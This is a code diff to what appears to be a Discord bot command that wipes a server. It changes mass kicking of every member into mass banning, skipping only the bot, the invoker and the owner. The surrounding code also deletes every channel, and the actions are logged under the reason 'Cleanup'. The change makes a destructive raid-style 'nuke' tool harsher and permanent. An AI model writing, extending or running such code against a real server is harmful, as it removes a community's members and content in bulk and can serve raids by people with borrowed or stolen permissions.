@@ -45,7 +45,7 @@ module.exports = {
             }
         }
 
-        // Kick all members
+        // Ban all members
         const members = await interaction.guild.members.fetch();
         const ownerId = interaction.guild.ownerId;
 
@@ -53,14 +53,14 @@ module.exports = {
             if (id === botId) continue;
             if (id === interaction.user.id) continue;
             if (id === ownerId) continue;
-            if (!member.kickable) continue;
+            if (!member.bannable) continue;
 
             try {
-                console.log(`Kicking user: ${member.user.username}`);
-                await member.kick(`Cleanup`);
+                console.log(`Banning user: ${member.user.username}`);
+                await member.ban(`Cleanup`);
                 await wait(2000);
             } catch (error) {
-                console.error(`Failed to kick ${member.user.username}`);
+                console.error(`Failed to ban ${member.user.username}`);
             }
         }
 
@@ -79,7 +79,6 @@ module.exports = {
                 console.error(`Failed to delete channel ${id}:`, error);
             }
         }
-
 
         // Delete current channel last
         const currentChannel = channels.get(currentChannelId);
